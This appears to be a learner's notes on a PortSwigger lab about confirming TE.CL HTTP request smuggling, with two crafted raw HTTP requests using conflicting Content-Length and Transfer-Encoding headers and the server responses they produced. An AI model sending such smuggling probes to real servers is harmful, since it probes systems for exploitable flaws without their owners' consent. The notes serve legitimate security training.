[LAB](https://portswigger.net/web-security/request-smuggling/finding/lab-confirming-te-cl-via-differential-responses)
[Explained](https://www.youtube.com/watch?v=QaouEvhHefk&list=PLGb2cDlBWRUX1_7RAIjRkZDYgAB3VbUSw&index=5&ab_channel=JarnoTimmermans)

# Detection

```HTTP
POST / HTTP/1.1
Host: 0a69001803897d838055679c005a007c.web-security-academy.net
Content-Length: 11
Transfer-Encoding: chunked

3
abc
X

```

![[Pasted image 20250818175935.png]]
Got Invalid Request, which indicates that frontend doesn't use Content-Length header, and "X" is an invalid chunk size:
![[Invalid Chunk SIze.png]]


Confirming TE.CL with the second request from methodology
```
POST / HTTP/1.1
Host: 0a69001803897d838055679c005a007c.web-security-academy.net
Content-Length: 6
Transfer-Encoding: chunked

0

X
```
Got **Backend Timeout with 500 Internal Server Error**
![[Pasted image 20250818180347.png]]

Usage of Differential Responses:


![[Confirmation Diffential Responses TE CL.png]]